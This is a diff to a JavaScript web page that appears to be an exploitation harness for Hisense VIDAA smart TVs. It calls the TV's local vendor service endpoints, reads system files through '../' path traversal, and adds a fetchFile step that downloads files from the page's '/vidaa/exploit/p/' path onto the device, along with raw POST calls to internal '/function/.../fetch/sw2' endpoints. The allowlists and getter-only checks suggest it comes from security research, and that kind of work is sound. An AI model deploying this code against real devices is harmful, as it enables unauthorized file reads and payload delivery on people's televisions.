@@ -37,7 +37,9 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
 
   var SVC_ALLOW = { tvinfo: ["initialData"],
                     hiutils: ["getOSVersion", "getVersionStatus", "fileRead"],
-                    pkgmgr: ["getInstalledPkgs"] };
+                    pkgmgr: ["getInstalledPkgs"],
+                    "basic/fetcher": ["fetchFile"] };
+  var FN_ALLOW = ["basic/fetch/sw2", "system/fetch/sw2"];
   var START_ALLOW = ["basic/fetcher"]; /* start probe only; never any file-transfer api */
   var BASES = ["http://localhost:9009", "http://127.0.0.1:9009",
                "https://localhost:9888", "https://127.0.0.1:9888"];
@@ -46,7 +48,7 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
                       "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json",
                       "../var/run/superwatch_socket", "../var/local", "../OAD/AppUpgradeSwitch.json"];
   var goodBase = null;
-  var BUILD = "r7";
+  var BUILD = "r8";
   var SELF_SHA = null;
   function djb2(s) { var h = 5381; for (var i = 0; i < s.length; i++) { h = ((h * 33) + s.charCodeAt(i)) >>> 0; } return h.toString(16).padStart(8, "0"); }
   function captureSelf() {
@@ -106,6 +108,17 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
       clearTimeout(timer);
       return { fetchError: String(e && e.name ? e.name + ": " + e.message : e).slice(0, 160) };
     });
+  }
+
+  function postRaw(url, body, ms) {
+    var ctrl = (typeof AbortController === "function") ? new AbortController() : null;
+    var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, ms || 4000);
+    return fetch(url, { method: "POST", headers: { "content-type": "application/json" },
+                        body: body, signal: ctrl ? ctrl.signal : undefined })
+      .then(function (r) {
+        return r.text().then(function (t) { clearTimeout(timer); return { status: r.status, text: t.slice(0, 4000) }; });
+      })
+      .catch(function (e) { clearTimeout(timer); return { fetchError: String(e && e.message ? e.message : e).slice(0, 160) }; });
   }
 
   function wsRun(target, messages, ms) {
@@ -209,7 +222,11 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
   function opBrief(op) {
     if (!op) return "?";
     if (op.op === "fileRead") return "fileRead " + op.path;
-    if (op.op === "svc") return "svc " + op.svc + "." + op.api;
+    if (op.op === "svc") {
+      if (op.svc === "basic/fetcher") return "fetchFile -> " + ((op.args && op.args.directory) || "?");
+      return "svc " + op.svc + "." + op.api;
+    }
+    if (op.op === "fn") return "fn " + op.fnpath + " x" + ((op.list || []).length);
     if (op.op === "jsapi") return "jsapi " + op.fn + "(" + clip(op.args || [], 60) + ")";
     if (op.op === "native") return "native " + op.api;
     if (op.op === "ws") return "ws " + op.target + " x" + ((op.messages || []).length);
@@ -252,9 +269,25 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
       return { ok: isOk(res), path: op.path, content: clip(res && res.msg !== undefined ? res.msg : res, 30000) };
     }
     if (op.op === "svc") {
+      if (op.svc === "basic/fetcher") {
+        var fu = (op.args && op.args.url) || "";
+        if (fu.indexOf(location.origin) !== 0 || fu.indexOf("/vidaa/exploit/p/") < 0) {
+          return { rejected: "fetchFile url must be same-origin /vidaa/exploit/p/" };
+        }
+      }
       var base2 = op.base || goodBase || BASES[0];
       var r2 = parseVendor(await httpCall(base2, op.svc, op.api, op.args, 6000));
       return { ok: isOk(r2), content: clip(r2 && r2.msg !== undefined ? r2.msg : r2, 30000) };
+    }
+    if (op.op === "fn") {
+      if (FN_ALLOW.indexOf(op.fnpath) < 0) return { rejected: "fnpath not allowed" };
+      var targets = [goodBase || BASES[0], "https://localhost:9888"];
+      var last = null;
+      for (var ti = 0; ti < targets.length; ti++) {
+        last = await postRaw(targets[ti] + "/function/" + op.fnpath, JSON.stringify({ list: op.list || [] }), 7000);
+        if (last && last.status) return { ok: true, via: targets[ti], response: clip(last.text, 4000) };
+      }
+      return { err: clip(last, 300) || "fn unreachable" };
     }
     if (op.op === "jsapi") {
       if (!/^(?:Hisense_Get|His_get)[A-Za-z0-9_]{0,60}$/.test(op.fn || "")) return { rejected: "jsapi getter-only" };
